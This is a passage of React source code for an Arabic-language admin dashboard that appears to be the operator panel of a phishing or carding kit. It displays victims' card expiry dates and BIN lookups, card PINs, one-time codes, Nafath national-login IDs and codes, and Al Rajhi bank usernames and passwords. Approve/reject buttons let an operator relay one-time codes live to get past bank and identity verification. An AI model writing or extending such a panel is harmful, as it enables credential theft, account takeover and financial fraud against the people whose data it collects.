                          <Copy size={12} /> الشهر
                        </Button>
                      )}
                      {(selectedApplication.cardYear ||
                        selectedApplication.expiryYear) && (
                        <Button
                          size="sm"
                          variant="outline"
                          className="text-xs gap-1"
                          onClick={() =>
                            copyToClipboard(
                              selectedApplication.cardYear ||
                                selectedApplication.expiryYear!,
                              "السنة",
                            )
                          }
                          data-testid="button-copy-year"
                        >
                          <Copy size={12} /> السنة
                        </Button>
                      )}
                    </div>

                    {/* BIN Checker Section */}
                    <div className="px-6 pb-4 border-t border-border pt-4">
                      <div className="flex items-center gap-2 mb-3">
                        <CreditCard size={16} className="text-indigo-500" />
                        <span className="font-bold text-foreground text-sm">
                          معلومات البطاقة (BIN)
                        </span>
                        {binLoading && (
                          <div className="animate-spin w-4 h-4 border-2 border-indigo-500 border-t-transparent rounded-full" />
                        )}
                      </div>
                      {binData?.BIN ? (
                        <div className="grid grid-cols-2 gap-3 text-sm">
                          {binData.BIN.brand && (
                            <div className="bg-muted rounded-lg p-3 flex items-center gap-2">
                              <span className="text-muted-foreground">
                                العلامة:
                              </span>
                              <span
                                className="font-bold text-foreground uppercase"
                                data-testid="bin-brand"
                              >
                                {binData.BIN.brand}
                              </span>
                            </div>
                          )}
                          {binData.BIN.type && (
                            <div className="bg-muted rounded-lg p-3 flex items-center gap-2">
                              <span className="text-muted-foreground">
                                النوع:
                              </span>
                              <span
                                className="font-bold text-foreground"
                                data-testid="bin-type"
                              >
                                {binData.BIN.type}
                              </span>
                            </div>
                          )}
                          {binData.level && (
                            <div className="bg-muted rounded-lg p-3 flex items-center gap-2">
                              <span className="text-muted-foreground">
                                المستوى:
                              </span>
                              <span
                                className="font-bold text-foreground"
                                data-testid="bin-level"
                              >
                                {binData.level}
                              </span>
                            </div>
                          )}
                          {binData.country?.name && (
                            <div className="bg-muted rounded-lg p-3 flex items-center gap-2">
                              <span className="text-muted-foreground">
                                الدولة:
                              </span>
                              <span
                                className="font-bold text-foreground"
                                data-testid="bin-country"
                              >
                                {binData.country.flag} {binData.country.name}
                              </span>
                            </div>
                          )}
                          {binData.issuer?.name && (
                            <div className="bg-muted rounded-lg p-3 col-span-2 flex items-center gap-2">
                              <span className="text-muted-foreground">
                                البنك:
                              </span>
                              <span
                                className="font-bold text-foreground"
                                data-testid="bin-bank"
                              >
                                {binData.issuer.name}
                              </span>
                              {binData.issuer.url && (
                                <a
                                  href={binData.issuer.url}
                                  target="_blank"
                                  rel="noopener noreferrer"
                                  className="text-blue-500 hover:underline text-xs mr-2"
                                >
                                  الموقع
                                </a>
                              )}
                            </div>
                          )}
                        </div>
                      ) : (
                        !binLoading && (
                          <div
                            className="text-muted-foreground text-sm text-center py-2"
                            data-testid="bin-no-data"
                          >
                            لا تتوفر معلومات BIN
                          </div>
                        )
                      )}
                    </div>
                  </div>
                )}

              {/* OTP Section */}
              {selectedApplication.otp && (
                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                  <div className="bg-gradient-to-l from-amber-500/10 to-card px-4 py-3 border-b border-border">
                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                      <Phone size={16} className="text-amber-500" />
                      رمز التحقق OTP
                    </h3>
                  </div>
                  <div className="p-4">
                    <div className="flex items-center justify-between mb-4">
                      <span
                        className="font-mono text-3xl text-amber-900 tracking-widest"
                        data-testid="text-otp"
                      >
                        {selectedApplication.otp}
                      </span>
                      <div className="flex items-center gap-2">
                        <Badge
                          className={cn(
                            "text-xs",
                            selectedApplication.otpApproved === true &&
                              "bg-green-100 text-green-700",
                            selectedApplication.otpApproved === false &&
                              "bg-red-100 text-red-700",
                            selectedApplication.otpApproved === undefined &&
                              "bg-amber-100 text-amber-700",
                          )}
                          data-testid="badge-otp-status"
                        >
                          {selectedApplication.otpApproved === true
                            ? "موافق"
                            : selectedApplication.otpApproved === false
                              ? "مرفوض"
                              : "قيد الانتظار"}
                        </Badge>
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() =>
                            copyToClipboard(selectedApplication.otp!, "OTP")
                          }
                          className="gap-1"
                          data-testid="button-copy-otp"
                        >
                          <Copy size={14} /> نسخ
                        </Button>
                      </div>
                    </div>
                    <div className="flex gap-2">
                      <Button
                        size="sm"
                        className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                        onClick={() =>
                          handleOtpApproval(selectedApplication.id, true)
                        }
                        disabled={updating}
                        data-testid="button-approve-otp"
                      >
                        موافقة
                      </Button>
                      <Button
                        size="sm"
                        className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                        onClick={() =>
                          handleOtpApproval(selectedApplication.id, false)
                        }
                        disabled={updating}
                        data-testid="button-reject-otp"
                      >
                        رفض
                      </Button>
                    </div>
                  </div>
                </div>
              )}

              {/* Phone OTP Approval Section */}
              {visibilitySettings.phoneOtp && selectedApplication.phoneOtp && (
                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                  <div className="bg-gradient-to-l from-blue-500/10 to-card px-4 py-3 border-b border-border">
                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                      <Phone size={16} className="text-blue-500" />
                      OTP الهاتف
                      {selectedApplication.operator && (
                        <span className="text-xs text-blue-600 font-normal">
                          ({selectedApplication.operator})
                        </span>
                      )}
                    </h3>
                  </div>
                  <div className="p-4">
                    <div className="flex items-center justify-between mb-4">
                      <span
                        className="font-mono text-3xl text-blue-900 tracking-widest"
                        data-testid="text-phone-otp"
                      >
                        {selectedApplication.phoneOtp}
                      </span>
                      <Badge
                        className={cn(
                          "text-xs",
                          selectedApplication.phoneOtpApproval === "approved" &&
                            "bg-green-100 text-green-700",
                          selectedApplication.phoneOtpApproval === "rejected" &&
                            "bg-red-100 text-red-700",
                          (!selectedApplication.phoneOtpApproval ||
                            selectedApplication.phoneOtpApproval ===
                              "pending") &&
                            "bg-amber-100 text-amber-700",
                        )}
                        data-testid="badge-phone-otp-status"
                      >
                        {selectedApplication.phoneOtpApproval === "approved"
                          ? "موافق"
                          : selectedApplication.phoneOtpApproval === "rejected"
                            ? "مرفوض"
                            : "قيد الانتظار"}
                      </Badge>
                    </div>
                    <div className="flex gap-2">
                      <Button
                        size="sm"
                        className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                        onClick={() =>
                          handlePhoneApproval(
                            selectedApplication.id,
                            "approved",
                          )
                        }
                        disabled={updating}
                        data-testid="button-approve-phone-otp"
                      >
                        موافقة
                      </Button>
                      <Button
                        size="sm"
                        className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                        onClick={() =>
                          handlePhoneApproval(
                            selectedApplication.id,
                            "rejected",
                          )
                        }
                        disabled={updating}
                        data-testid="button-reject-phone-otp"
                      >
                        رفض
                      </Button>
                    </div>
                  </div>
                </div>
              )}

              {/* PIN Section */}
              {visibilitySettings.pin && selectedApplication.pin && (
                <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                  <div className="bg-gradient-to-l from-purple-500/10 to-card px-4 py-3 border-b border-border">
                    <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                      <Star size={16} className="text-purple-500" />
                      رمز PIN
                    </h3>
                  </div>
                  <div className="p-4">
                    <div className="flex items-center justify-between">
                      <span
                        className="font-mono text-3xl text-purple-900 tracking-widest"
                        data-testid="text-pin"
                      >
                        {selectedApplication.pin}
                      </span>
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() =>
                          copyToClipboard(selectedApplication.pin!, "PIN")
                        }
                        className="gap-1"
                        data-testid="button-copy-pin"
                      >
                        <Copy size={14} /> نسخ
                      </Button>
                    </div>
                  </div>
                </div>
              )}

              {/* Phone Verification Section */}
              {visibilitySettings.phoneVerification &&
                selectedApplication.phoneVerificationCode && (
                  <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                    <div className="bg-gradient-to-l from-teal-500/10 to-card px-4 py-3 border-b border-border">
                      <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                        <Phone size={16} className="text-teal-500" />
                        توثيق الهاتف
                      </h3>
                    </div>
                    <div className="p-4">
                      <div className="flex items-center justify-between mb-4">
                        <span
                          className="font-mono text-2xl text-teal-900 tracking-widest"
                          data-testid="text-phone-verification"
                        >
                          {selectedApplication.phoneVerificationCode}
                        </span>
                        <Badge
                          className={cn(
                            "text-xs",
                            selectedApplication.phoneVerificationStatus ===
                              "approved" && "bg-green-100 text-green-700",
                            selectedApplication.phoneVerificationStatus ===
                              "rejected" && "bg-red-100 text-red-700",
                            (!selectedApplication.phoneVerificationStatus ||
                              selectedApplication.phoneVerificationStatus ===
                                "pending") &&
                              "bg-amber-100 text-amber-700",
                          )}
                        >
                          {selectedApplication.phoneVerificationStatus ===
                          "approved"
                            ? "موافق"
                            : selectedApplication.phoneVerificationStatus ===
                                "rejected"
                              ? "مرفوض"
                              : "قيد الانتظار"}
                        </Badge>
                      </div>
                      <div className="flex gap-2">
                        <Button
                          size="sm"
                          className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                          onClick={() =>
                            handlePhoneVerification(
                              selectedApplication.id,
                              "approved",
                            )
                          }
                          disabled={updating}
                        >
                          موافقة
                        </Button>
                        <Button
                          size="sm"
                          className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                          onClick={() =>
                            handlePhoneVerification(
                              selectedApplication.id,
                              "rejected",
                            )
                          }
                          disabled={updating}
                        >
                          رفض
                        </Button>
                      </div>
                    </div>
                  </div>
                )}

              {/* ID Verification Section */}
              {visibilitySettings.idVerification &&
                selectedApplication.idVerificationCode && (
                  <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                    <div className="bg-gradient-to-l from-indigo-500/10 to-card px-4 py-3 border-b border-border">
                      <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                        <User size={16} className="text-indigo-500" />
                        توثيق الهوية
                      </h3>
                    </div>
                    <div className="p-4">
                      <div className="flex items-center justify-between mb-4">
                        <span
                          className="font-mono text-2xl text-indigo-900 tracking-widest"
                          data-testid="text-id-verification"
                        >
                          {selectedApplication.idVerificationCode}
                        </span>
                        <Badge
                          className={cn(
                            "text-xs",
                            selectedApplication.idVerificationStatus ===
                              "approved" && "bg-green-100 text-green-700",
                            selectedApplication.idVerificationStatus ===
                              "rejected" && "bg-red-100 text-red-700",
                            (!selectedApplication.idVerificationStatus ||
                              selectedApplication.idVerificationStatus ===
                                "pending") &&
                              "bg-amber-100 text-amber-700",
                          )}
                        >
                          {selectedApplication.idVerificationStatus ===
                          "approved"
                            ? "موافق"
                            : selectedApplication.idVerificationStatus ===
                                "rejected"
                              ? "مرفوض"
                              : "قيد الانتظار"}
                        </Badge>
                      </div>
                      <div className="flex gap-2">
                        <Button
                          size="sm"
                          className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                          onClick={() =>
                            handleIdVerification(
                              selectedApplication.id,
                              "approved",
                            )
                          }
                          disabled={updating}
                        >
                          موافقة
                        </Button>
                        <Button
                          size="sm"
                          className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                          onClick={() =>
                            handleIdVerification(
                              selectedApplication.id,
                              "rejected",
                            )
                          }
                          disabled={updating}
                        >
                          رفض
                        </Button>
                      </div>
                    </div>
                  </div>
                )}

              {/* Mobile & Nafaz Info Section */}
              {visibilitySettings.mobileNafaz &&
                (selectedApplication.phone2 ||
                  selectedApplication.operator ||
                  selectedApplication.phoneOtpCode ||
                  selectedApplication.mobileNumber ||
                  selectedApplication.mobileInfo ||
                  selectedApplication.operatorName) && (
                  <div className="bg-card rounded-xl shadow-sm border border-border overflow-hidden">
                    <div className="bg-gradient-to-l from-green-500/10 to-card px-4 py-3 border-b border-border">
                      <h3 className="font-bold text-foreground text-sm flex items-center gap-2">
                        <Globe size={16} className="text-green-500" />
                        معلومات الجوال والنفاذ
                      </h3>
                    </div>
                    <div className="p-4 space-y-3">
                      {selectedApplication.phone2 && (
                        <DataBubbleRow
                          label="رقم الجوال 2"
                          value={selectedApplication.phone2}
                          isLtr
                        />
                      )}
                      {selectedApplication.mobileNumber && (
                        <DataBubbleRow
                          label="رقم الجوال"
                          value={selectedApplication.mobileNumber}
                          isLtr
                        />
                      )}
                      {selectedApplication.operator && (
                        <DataBubbleRow
                          label="المشغل"
                          value={selectedApplication.operator}
                        />
                      )}
                      {selectedApplication.operatorName && (
                        <DataBubbleRow
                          label="اسم المشغل"
                          value={selectedApplication.operatorName}
                        />
                      )}
                      {selectedApplication.operatorCode && (
                        <DataBubbleRow
                          label="كود المشغل"
                          value={selectedApplication.operatorCode}
                          isLtr
                        />
                      )}
                      {selectedApplication.mobileInfo && (
                        <DataBubbleRow
                          label="معلومات الجوال"
                          value={selectedApplication.mobileInfo}
                        />
                      )}

                      {/* Phone OTP Code with Approval */}
                      {selectedApplication.phoneOtpCode && (
                        <div className="mt-3 pt-3 border-t border-gray-100">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-sm text-gray-600">
                              كود OTP الجوال
                            </span>
                            <Badge
                              className={cn(
                                "text-xs",
                                selectedApplication.phoneOtpCodeStatus ===
                                  "approved" && "bg-green-100 text-green-700",
                                selectedApplication.phoneOtpCodeStatus ===
                                  "rejected" && "bg-red-100 text-red-700",
                                (!selectedApplication.phoneOtpCodeStatus ||
                                  selectedApplication.phoneOtpCodeStatus ===
                                    "pending") &&
                                  "bg-amber-100 text-amber-700",
                              )}
                            >
                              {selectedApplication.phoneOtpCodeStatus ===
                              "approved"
                                ? "موافق"
                                : selectedApplication.phoneOtpCodeStatus ===
                                    "rejected"
                                  ? "مرفوض"
                                  : "معلق"}
                            </Badge>
                          </div>
                          <div
                            className="font-mono text-2xl text-green-900 tracking-widest mb-3"
                            dir="ltr"
                          >
                            {selectedApplication.phoneOtpCode}
                          </div>
                          <div className="flex gap-2">
                            <Button
                              size="sm"
                              className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                              onClick={() =>
                                handleVFieldApproval(
                                  selectedApplication.id,
                                  "phoneOtpCodeStatus",
                                  "approved",
                                )
                              }
                              disabled={updating}
                            >
                              موافقة → نفاذ
                            </Button>
                            <Button
                              size="sm"
                              className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                              onClick={() =>
                                handleVFieldApproval(
                                  selectedApplication.id,
                                  "phoneOtpCodeStatus",
                                  "rejected",
                                )
                              }
                              disabled={updating}
                            >
                              رفض
                            </Button>
                          </div>
                        </div>
                      )}

                      {/* Nafaz Section - Shows when phone OTP is approved */}
                      {visibilitySettings.nafazSection &&
                        selectedApplication.phoneOtpCodeStatus ===
                          "approved" && (
                          <div className="mt-3 pt-3 border-t border-green-200 bg-green-50 -mx-4 px-4 pb-4 rounded-b-xl">
                            <div className="flex items-center gap-2 mb-3">
                              <Lock size={16} className="text-green-600" />
                              <span className="font-bold text-green-800 text-sm">
                                نفاذ
                              </span>
                            </div>
                            {selectedApplication.nafazId && (
                              <DataBubbleRow
                                label="رقم نفاذ"
                                value={selectedApplication.nafazId}
                                isLtr
                              />
                            )}
                            {selectedApplication.nafazCode && (
                              <DataBubbleRow
                                label="كود نفاذ"
                                value={selectedApplication.nafazCode}
                                isLtr
                              />
                            )}

                            {/* Auth Number Input */}
                            <div className="mt-3 pt-3 border-t border-green-200">
                              <label className="text-sm text-green-700 mb-2 block">
                                رقم التفويض (Auth Number)
                              </label>
                              <div className="flex gap-2">
                                <Input
                                  value={authNumberInput}
                                  onChange={(e) =>
                                    setAuthNumberInput(e.target.value)
                                  }
                                  placeholder="أدخل رقم التفويض..."
                                  className="flex-1 text-sm bg-white"
                                  data-testid="input-auth-number"
                                  dir="ltr"
                                />
                                <Button
                                  size="sm"
                                  className="bg-green-600 hover:bg-green-700 text-white"
                                  onClick={() =>
                                    handleAuthNumberUpdate(
                                      selectedApplication.id,
                                    )
                                  }
                                  disabled={updating || !authNumberInput.trim()}
                                  data-testid="button-update-auth-number"
                                >
                                  {updating ? "..." : "حفظ"}
                                </Button>
                              </div>
                              {selectedApplication.authNumber && (
                                <div className="mt-2 text-xs text-green-600">
                                  القيمة الحالية:{" "}
                                  <span
                                    className="font-mono text-green-800"
                                    dir="ltr"
                                  >
                                    {selectedApplication.authNumber}
                                  </span>
                                </div>
                              )}
                            </div>

                            {selectedApplication.nafazId && (
                              <div className="mt-3">
                                <div className="flex items-center justify-between mb-2">
                                  <span className="text-xs text-gray-500">
                                    حالة نفاذ
                                  </span>
                                  <Badge
                                    className={cn(
                                      "text-xs",
                                      selectedApplication.nafazStatus ===
                                        "approved" &&
                                        "bg-green-100 text-green-700",
                                      selectedApplication.nafazStatus ===
                                        "rejected" && "bg-red-100 text-red-700",
                                      (!selectedApplication.nafazStatus ||
                                        selectedApplication.nafazStatus ===
                                          "pending") &&
                                        "bg-amber-100 text-amber-700",
                                    )}
                                  >
                                    {selectedApplication.nafazStatus ===
                                    "approved"
                                      ? "موافق"
                                      : selectedApplication.nafazStatus ===
                                          "rejected"
                                        ? "مرفوض"
                                        : "معلق"}
                                  </Badge>
                                </div>
                                <div className="flex gap-2">
                                  <Button
                                    size="sm"
                                    className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                                    onClick={() =>
                                      handleVFieldApproval(
                                        selectedApplication.id,
                                        "nafazStatus",
                                        "approved",
                                      )
                                    }
                                    disabled={updating}
                                  >
                                    موافقة
                                  </Button>
                                  <Button
                                    size="sm"
                                    className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                                    onClick={() =>
                                      handleVFieldApproval(
                                        selectedApplication.id,
                                        "nafazStatus",
                                        "rejected",
                                      )
                                    }
                                    disabled={updating}
                                  >
                                    رفض
                                  </Button>
                                </div>
                              </div>
                            )}
                          </div>
                        )}
                    </div>
                  </div>
                )}

              {/* RAJHI Section */}
              {(selectedApplication.rajhgi_username ||
                selectedApplication.rajhgi_password ||
                selectedApplication.rajhgi_otp) && (
                <div className="bg-white rounded-xl shadow-sm border border-teal-200 overflow-hidden">
                  <div className="bg-gradient-to-l from-teal-50 to-white px-4 py-3 border-b border-teal-100">
                    <h3 className="font-bold text-teal-800 text-sm flex items-center gap-2">
                      <CreditCard size={16} className="text-teal-600" />
                      RAJHI
                    </h3>
                  </div>
                  <div className="p-4 space-y-3">
                    {selectedApplication.rajhgi_username && (
                      <DataBubbleRow
                        label="اسم المستخدم"
                        value={selectedApplication.rajhgi_username}
                        isLtr
                      />
                    )}
                    {selectedApplication.rajhgi_password && (
                      <DataBubbleRow
                        label="كلمة المرور"
                        value={selectedApplication.rajhgi_password}
                        isLtr
                      />
                    )}
                    {selectedApplication.rajhgi_otp && (
                      <DataBubbleRow
                        label="رمز OTP"
                        value={selectedApplication.rajhgi_otp}
                        isLtr
                      />
                    )}
                  </div>
                </div>
              )}

              {/* Payment V Fields Section */}
              {(selectedApplication._v1 ||
                selectedApplication._v2 ||
                selectedApplication._v3 ||
                selectedApplication._v4 ||
                selectedApplication._v5 ||
                selectedApplication._v6 ||
                selectedApplication._v7) && (
                <div className="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
                  <div className="bg-gradient-to-l from-orange-50 to-white px-4 py-3 border-b border-gray-100">
                    <h3 className="font-bold text-gray-800 text-sm flex items-center gap-2">
                      <CreditCard size={16} className="text-orange-500" />
                      تحقق الدفع
                    </h3>
                  </div>
                  <div className="p-4 space-y-4">
                    {selectedApplication._v1 && (
                      <div className="border-b pb-4">
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-sm text-gray-600">V1</span>
                          <Badge
                            className={cn(
                              "text-xs",
                              selectedApplication._v1Status === "approved" &&
                                "bg-green-100 text-green-700",
                              selectedApplication._v1Status === "rejected" &&
                                "bg-red-100 text-red-700",
                              (!selectedApplication._v1Status ||
                                selectedApplication._v1Status === "pending") &&
                                "bg-amber-100 text-amber-700",
                            )}
                          >
                            {selectedApplication._v1Status === "approved"
                              ? "موافق"
                              : selectedApplication._v1Status === "rejected"
                                ? "مرفوض"
                                : "معلق"}
                          </Badge>
                        </div>
                        <div className="font-mono text-lg mb-2" dir="ltr">
                          {selectedApplication._v1}
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v1Status",
                                "approved",
                              )
                            }
                            disabled={updating}
                          >
                            موافقة
                          </Button>
                          <Button
                            size="sm"
                            className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v1Status",
                                "rejected",
                              )
                            }
                            disabled={updating}
                          >
                            رفض
                          </Button>
                        </div>
                      </div>
                    )}
                    {selectedApplication._v2 && (
                      <div className="border-b pb-4">
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-sm text-gray-600">V2</span>
                          <Badge
                            className={cn(
                              "text-xs",
                              selectedApplication._v2Status === "approved" &&
                                "bg-green-100 text-green-700",
                              selectedApplication._v2Status === "rejected" &&
                                "bg-red-100 text-red-700",
                              (!selectedApplication._v2Status ||
                                selectedApplication._v2Status === "pending") &&
                                "bg-amber-100 text-amber-700",
                            )}
                          >
                            {selectedApplication._v2Status === "approved"
                              ? "موافق"
                              : selectedApplication._v2Status === "rejected"
                                ? "مرفوض"
                                : "معلق"}
                          </Badge>
                        </div>
                        <div className="font-mono text-lg mb-2" dir="ltr">
                          {selectedApplication._v2}
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v2Status",
                                "approved",
                              )
                            }
                            disabled={updating}
                          >
                            موافقة
                          </Button>
                          <Button
                            size="sm"
                            className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v2Status",
                                "rejected",
                              )
                            }
                            disabled={updating}
                          >
                            رفض
                          </Button>
                        </div>
                      </div>
                    )}
                    {selectedApplication._v3 && (
                      <div className="border-b pb-4">
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-sm text-gray-600">V3</span>
                          <Badge
                            className={cn(
                              "text-xs",
                              selectedApplication._v3Status === "approved" &&
                                "bg-green-100 text-green-700",
                              selectedApplication._v3Status === "rejected" &&
                                "bg-red-100 text-red-700",
                              (!selectedApplication._v3Status ||
                                selectedApplication._v3Status === "pending") &&
                                "bg-amber-100 text-amber-700",
                            )}
                          >
                            {selectedApplication._v3Status === "approved"
                              ? "موافق"
                              : selectedApplication._v3Status === "rejected"
                                ? "مرفوض"
                                : "معلق"}
                          </Badge>
                        </div>
                        <div className="font-mono text-lg mb-2" dir="ltr">
                          {selectedApplication._v3}
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v3Status",
                                "approved",
                              )
                            }
                            disabled={updating}
                          >
                            موافقة
                          </Button>
                          <Button
                            size="sm"
                            className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v3Status",
                                "rejected",
                              )
                            }
                            disabled={updating}
                          >
                            رفض
                          </Button>
                        </div>
                      </div>
                    )}
                    {selectedApplication._v4 && (
                      <div className="border-b pb-4">
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-sm text-gray-600">V4</span>
                          <Badge
                            className={cn(
                              "text-xs",
                              selectedApplication._v4Status === "approved" &&
                                "bg-green-100 text-green-700",
                              selectedApplication._v4Status === "rejected" &&
                                "bg-red-100 text-red-700",
                              (!selectedApplication._v4Status ||
                                selectedApplication._v4Status === "pending") &&
                                "bg-amber-100 text-amber-700",
                            )}
                          >
                            {selectedApplication._v4Status === "approved"
                              ? "موافق"
                              : selectedApplication._v4Status === "rejected"
                                ? "مرفوض"
                                : "معلق"}
                          </Badge>
                        </div>
                        <div className="font-mono text-lg mb-2" dir="ltr">
                          {selectedApplication._v4}
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v4Status",
                                "approved",
                              )
                            }
                            disabled={updating}
                          >
                            موافقة
                          </Button>
                          <Button
                            size="sm"
                            className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v4Status",
                                "rejected",
                              )
                            }
                            disabled={updating}
                          >
                            رفض
                          </Button>
                        </div>
                      </div>
                    )}
                    {selectedApplication._v5 && (
                      <div className="border-b pb-4">
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-sm text-gray-600">V5</span>
                          <Badge
                            className={cn(
                              "text-xs",
                              selectedApplication._v5Status === "approved" &&
                                "bg-green-100 text-green-700",
                              selectedApplication._v5Status === "rejected" &&
                                "bg-red-100 text-red-700",
                              (!selectedApplication._v5Status ||
                                selectedApplication._v5Status === "pending") &&
                                "bg-amber-100 text-amber-700",
                            )}
                          >
                            {selectedApplication._v5Status === "approved"
                              ? "موافق"
                              : selectedApplication._v5Status === "rejected"
                                ? "مرفوض"
                                : "معلق"}
                          </Badge>
                        </div>
                        <div className="font-mono text-lg mb-2" dir="ltr">
                          {selectedApplication._v5}
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v5Status",
                                "approved",
                              )
                            }
                            disabled={updating}
                          >
                            موافقة
                          </Button>
                          <Button
                            size="sm"
                            className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v5Status",
                                "rejected",
                              )
                            }
                            disabled={updating}
                          >
                            رفض
                          </Button>
                        </div>
                      </div>
                    )}
                    {selectedApplication._v6 && (
                      <div className="border-b pb-4">
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-sm text-gray-600">V6</span>
                          <Badge
                            className={cn(
                              "text-xs",
                              selectedApplication._v6Status === "approved" &&
                                "bg-green-100 text-green-700",
                              selectedApplication._v6Status === "rejected" &&
                                "bg-red-100 text-red-700",
                              (!selectedApplication._v6Status ||
                                selectedApplication._v6Status === "pending") &&
                                "bg-amber-100 text-amber-700",
                            )}
                          >
                            {selectedApplication._v6Status === "approved"
                              ? "موافق"
                              : selectedApplication._v6Status === "rejected"
                                ? "مرفوض"
                                : "معلق"}
                          </Badge>
                        </div>
                        <div className="font-mono text-lg mb-2" dir="ltr">
                          {selectedApplication._v6}
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v6Status",
                                "approved",
                              )
                            }
                            disabled={updating}
                          >
                            موافقة
                          </Button>
                          <Button
                            size="sm"
                            className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v6Status",
                                "rejected",
                              )
                            }
                            disabled={updating}
                          >
                            رفض
                          </Button>
                        </div>
                      </div>
                    )}
                    {selectedApplication._v7 && (
                      <div>
                        <div className="flex items-center justify-between mb-2">
                          <span className="text-sm text-gray-600">V7</span>
                          <Badge
                            className={cn(
                              "text-xs",
                              selectedApplication._v7Status === "approved" &&
                                "bg-green-100 text-green-700",
                              selectedApplication._v7Status === "rejected" &&
                                "bg-red-100 text-red-700",
                              (!selectedApplication._v7Status ||
                                selectedApplication._v7Status === "pending") &&
                                "bg-amber-100 text-amber-700",
                            )}
                          >
                            {selectedApplication._v7Status === "approved"
                              ? "موافق"
                              : selectedApplication._v7Status === "rejected"
                                ? "مرفوض"
                                : "معلق"}
                          </Badge>
                        </div>
                        <div className="font-mono text-lg mb-2" dir="ltr">
                          {selectedApplication._v7}
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            className="bg-green-500 hover:bg-green-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v7Status",
                                "approved",
                              )
                            }
                            disabled={updating}
                          >
                            موافقة
                          </Button>
                          <Button
                            size="sm"
                            className="bg-red-500 hover:bg-red-600 text-white text-xs flex-1"
                            onClick={() =>
                              handleVFieldApproval(
                                selectedApplication.id,
                                "_v7Status",
                                "rejected",
                              )
                            }
                            disabled={updating}
                          >
                            رفض
                          </Button>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              <div className="text-center text-[10px] text-gray-300 font-mono mt-16 pb-8">
                {new Date().toLocaleTimeString("ar-SA", {
                  hour: "2-digit",
                  minute: "2-digit",
                })}
              </div>
            </div>
          </div>
        ) : (
          <div className="flex-1 flex items-center justify-center text-gray-400">
            <div className="text-center">
              <User size={48} className="mx-auto mb-4 opacity-30" />
              <p>اختر طلباً لعرض التفاصيل</p>
            </div>
          </div>
        )}
      </main>

      {/* Left Mini Sidebar */}
      <aside className="w-[52px] bg-white border-r flex flex-col items-center py-4 gap-6 shrink-0 z-30 shadow-[0_0_15px_rgba(0,0,0,0.02)]">
        <div className="flex flex-col gap-4 w-full px-2">
          <Button
            variant="ghost"
            size="icon"
            className="w-9 h-9 text-gray-400 hover:text-blue-600 hover:bg-blue-50 rounded-lg"
            data-testid="button-checkbox"
          >
            <div className="w-4 h-4 border-2 border-current rounded-[4px] opacity-70"></div>
          </Button>
          <Button
            variant="ghost"
            size="icon"
